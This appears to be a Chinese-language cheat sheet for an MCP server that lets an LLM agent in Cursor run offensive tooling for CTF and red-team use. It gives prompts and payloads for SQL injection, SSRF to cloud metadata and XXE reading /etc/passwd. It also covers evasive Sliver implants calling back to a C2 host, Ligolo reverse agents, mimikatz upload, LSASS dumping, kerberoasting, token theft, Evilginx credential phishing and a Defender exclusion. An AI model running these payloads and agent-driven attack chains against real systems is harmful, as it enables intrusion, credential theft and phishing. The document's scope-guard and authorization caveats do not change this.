# 🏆 红队比赛 / CTF Cheatsheet

35 个 MCP tools 的 **自然语言触发短语大全**。在 Cursor 聊天框里直接说即可。

---

## 🎯 比赛前：先让 LLM 认识你

> **"列出所有可用的 MCP 工具，按用途分类"**
> *LLM 会调 `list_tools`，给你一份分类清单*

> **"我正在打 HackTheBox Season 7 比赛，目标 IP 10.10.11.42。把它加进授权 scope"**
> *提示：scope 已经预配好了 `10.10.11.0/24`，直接可用*

---

## 🔍 阶段 1：侦察 (Recon)

### Shodan — 不触碰目标的情报

| 你说 | LLM 调 | 额度 |
|------|--------|------|
| *"查 nginx 在美国有多少台"* | `shodan_count` | 0 |
| *"Redis 无密码的暴露数量？按国家排前 5"* | `shodan_facets` | 0 |
| *"10.10.11.42 这个 IP 在 Shodan 有什么信息"* | `shodan_host` | 1 |
| *"搜 `vuln:CVE-2024-6387 country:US` 前 10 条"* | `shodan_search` | 1 |
| *"我还剩多少 credits"* | `shodan_account_info` | 0 |

### Nuclei — 模板化漏扫

| 你说 | LLM 调 |
|------|--------|
| *"对 http://10.10.11.42 跑一遍 critical + high 级别扫描"* | `nuclei_scan` |
| *"只扫 CVE-2023 和 RCE 标签"* | `nuclei_scan` (`tags: ['cve2023','rce']`) |
| *"更新模板库"* | `nuclei_update_templates` |
| *"列出所有 log4shell 相关模板"* | `nuclei_list_templates` (`tags: ['log4j']`) |
| *"我写了个 YAML 模板，帮我验证语法"* | `nuclei_validate_template` |

---

## 🌐 阶段 2：Web 渗透（Caido）

| 你说 | LLM 调 |
|------|--------|
| *"启动 Caido 代理在 127.0.0.1:8080"* | `caido_start` |
| *"向 `http://10.10.11.42/login` 发 POST，body 是 `user=admin&pass=' OR 1=1--`"* | `caido_replay_request` |
| *"重放上次那个请求，但把 id 从 1 改成 2"* | `caido_replay_request` |
| *"向 `https://target/api/v1/users/1` 发 GET，加 Authorization: Bearer xxx，超时 10 秒"* | `caido_replay_request` |
| *"Caido 现在在运行吗"* | `caido_status` |

### 常见渗透 payload（让 LLM 自动填参数）

- **SQLi**：*"测试 `/search?q=` 端点的 SQL 注入，payload 用 `' AND SLEEP(5)--`"*
- **SSRF**：*"向内部地址 169.254.169.254/latest/meta-data 发 GET（通过目标代理）"*
- **IDOR**：*"枚举 /api/users/{1..20}，告诉我哪些返回 200 而不是 403"*
- **XXE**：*"body 设为 `<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>`"*

---

## 🕳️ 阶段 3：拿下第一个 shell 后 — 内网穿透 (Ligolo-ng)

**场景**：你在一个 DMZ 机器上拿到了 shell，现在想访问内网 `10.10.0.0/16`。

| 你说 | LLM 调 |
|------|--------|
| *"启动 Ligolo proxy 在 0.0.0.0:11601"* | `ligolo_start_proxy` |
| *"生成一个 Windows agent 的 PowerShell 一行命令，回连到 1.2.3.4:11601"* | `ligolo_generate_agent_command` |
| *"生成 Linux agent 的 bash 一行命令"* | `ligolo_generate_agent_command` (`os_family: 'linux'`) |
| *"把 10.10.0.0/16 路由到 ligolo TUN 接口"* | `ligolo_add_route` |
| *"Ligolo 代理还在跑吗"* | `ligolo_proxy_status` |
| *"关掉 ligolo"* | `ligolo_stop_proxy` |

### 快速流程
```
1. ligolo_start_proxy        (在你的攻击机)
2. ligolo_generate_agent_command  (拿到一行 cmd)
3. 把那行 cmd 在受害机上跑
4. ligolo_add_route 10.10.0.0/16
5. 现在 nmap / curl / ssh 可以直接访问内网
```

---

## 💀 阶段 4：持久化 + 横向移动 (Sliver C2)

### 启动基础设施
| 你说 | LLM 调 |
|------|--------|
| *"启动 Sliver teamserver"* | `sliver_start_server` |
| *"创建一个 HTTPS 监听器，端口 443，域名 c2.lab.test"* | `sliver_run_command` (`listeners https --lhost 0.0.0.0 --lport 443 --domain c2.lab.test`) |
| *"列出所有监听器"* | `sliver_list_listeners` |

### 生成 Payload
| 你说 | LLM 调 |
|------|--------|
| *"生成 Windows x64 exe，通过 HTTPS 回连 c2.lab.test:443，加 --evasion，保存到 D:/tmp/implant.exe"* | `sliver_generate_implant` |
| *"生成 shellcode 格式的 beacon，60 秒 check-in，30% jitter"* | `sliver_generate_implant` (`format: 'shellcode', beacon: true`) |
| *"生成 Linux x64 DLL"* | `sliver_generate_implant` |

### 会话管理
| 你说 | LLM 调 |
|------|--------|
| *"查看所有活跃 session"* | `sliver_list_sessions` |
| *"在 session SESSION_ID 里运行 whoami /all"* | `sliver_execute_in_session` |
| *"在 session XXX 里上传 mimikatz.exe 到 C:/temp/"* | `sliver_execute_in_session` (`command: "upload mimikatz.exe C:/temp/"`) |
| *"在 session XXX 里下载 C:/temp/hashes.txt"* | `sliver_execute_in_session` (`command: "download C:/temp/hashes.txt"`) |

### 高级后渗透（在 session 里）
- *"在 session X 里执行 `execute-assembly SharpHound.exe -c All`"* — AD 枚举
- *"在 session X 里运行 `execute-assembly Rubeus.exe kerberoast`"* — Kerberoasting
- *"在 session X 里 `procdump lsass.exe`"* — LSASS dump
- *"在 session X 里 `token steal 1234`"* — 盗用进程 token

---

## 🎣 阶段 5：钓鱼演练 (Evilginx) — **仅授权场景**

> ⚠️ Evilginx 仅在有**书面授权**的钓鱼演练 / 内部红队 / CTF 中使用。中国《刑法》285/286 条对未授权使用有重罪。

| 你说 | LLM 调 |
|------|--------|
| *"启动 Evilginx，钓鱼域名 `phish.lab.test`，developer 模式"* | `evilginx_start` |
| *"列出所有可用的 phishlets"* | `evilginx_list_phishlets` |
| *"Evilginx 现在跑着吗"* | `evilginx_status` |
| *"看看已经捕获了多少 session（密码脱敏）"* | `evilginx_list_captured_sessions` |
| *"关掉 Evilginx"* | `evilginx_stop` |

### 比赛实际工作流
```
1. evilginx_start (phish_hostname 必须在 scope 里)
2. 在 Evilginx 里手动运行：
     config domain phish.lab.test
     phishlets hostname o365 phish.lab.test
     phishlets enable o365
     lures create o365
     lures get-url 0
3. 把得到的 URL 发给授权的测试目标
4. evilginx_list_captured_sessions 查收获
```

---

## 📝 阶段 6：报告生成

| 你说 |
|------|
| *"根据我今天的所有 tool 调用，生成一份 pentest 报告，标题 `HTB Season 7 Week 3`，我是 tester `bofud`，scope `10.10.11.42`，把发现的 SQLi 和 SSRF 都记录进去"* |

LLM 调 `generate_pentest_report`，返回专业 Markdown 报告。

---

## 🧬 高阶：一句话全流程

### 完整侦察链
> *"对 example.com 做全面侦察：Shodan 找它的所有 IP，每个 IP 查开放端口和已知漏洞，然后对 HTTP 服务跑 critical 级别的 Nuclei 扫描"*

LLM 会按顺序调：`recon_target`（workflow 把上面 3 步合成一个 tool）

### 完整攻击链（最牛的用法）
> *"帮我：1) 查 10.10.11.42 的 Shodan 信息 2) 用 nuclei 扫它 3) 如果发现 RCE 漏洞，用 Caido 手动复现 4) 拿下后生成 Sliver payload 准备持久化"*

LLM 会分步思考 + 按顺序调 4 个工具，全程记录审计日志。

---

## 🚨 安全红线 — ScopeGuard 自动防护

即使 LLM 被骗要攻击 scope 外的目标，服务器直接拒绝：

```
你：对 google.com 做 Nuclei 扫描
LLM：→ nuclei_scan({"targets": ["google.com"]})
Server: AUTHORIZATION DENIED — google.com not in authorized_scope
```

你当前的 scope 已经包含：
```
本地:       127.0.0.1, localhost
实验室:     *.lab.internal, *.lab.test, *.local
CTF 平台:   *.htb, *.htb.net, *.thm, *.tryhackme.com, *.ctf
HTB VPN:    10.10.10.0/24, 10.10.11.0/24, 10.10.14.0/23, 10.10.0.0/16
内网:       172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16
```

**改 scope**：编辑 `C:\Users\bofud\.cursor\mcp.json` 里的 `KESTREL_MCP_SECURITY__AUTHORIZED_SCOPE`，重启 Cursor。

---

## 📊 审计 — 赛后复盘用

所有 tool 调用都写入：
```
C:\Users\bofud\.kestrel\logs\server.log     (结构化 JSON)
```

比赛结束后：
```powershell
# 查当天的所有 tool 调用
Get-Content "$env:USERPROFILE\.kestrel\logs\server.log" |
    Where-Object { $_ -match '"audit":\s*true' } |
    ConvertFrom-Json |
    Format-Table timestamp, event, @{N='args';E={$_.argument_keys -join ','}} -AutoSize
```

---

## 🧯 紧急操作

| 情况 | 操作 |
|------|------|
| 想暂停所有攻击 | 加 `"--dry-run"` 到 mcp.json 的 args |
| 想完全禁用 MCP | 在 Cursor Settings 里关闭 MCP server |
| 怀疑被反制 | 立刻 `sliver_stop_server` + `ligolo_stop_proxy` + `evilginx_stop` |
| Defender 又吃工具 | 把路径加到排除：`Add-MpPreference -ExclusionPath C:\path` (管理员 PowerShell) |

---

## 🎁 比赛日 Pre-flight Checklist

早上开赛前 5 分钟跑一遍：

```powershell
cd "d:\TG PROJECT\kestrel-mcp"
.\.venv\Scripts\python.exe scripts\full_verify.py
```

应看到 `Result: 8/8 checks passed.`

然后在 Cursor 里问：
> **"doctor 一下，列出所有 ready 的工具"**

LLM 会用 MCP 报告所有就绪状态。稳了就开干。

---

## 📚 配套文档

- [README.md](./README.md) — 项目完整说明
- [QUICKSTART.md](./QUICKSTART.md) — 安装速记
- [LICENSE](./LICENSE) — 责任免责（含法律条款）
- `~/.cursor/mcp.json` — 你的实际配置
- `~/.kestrel/logs/` — 审计日志

**祝比赛顺利。**
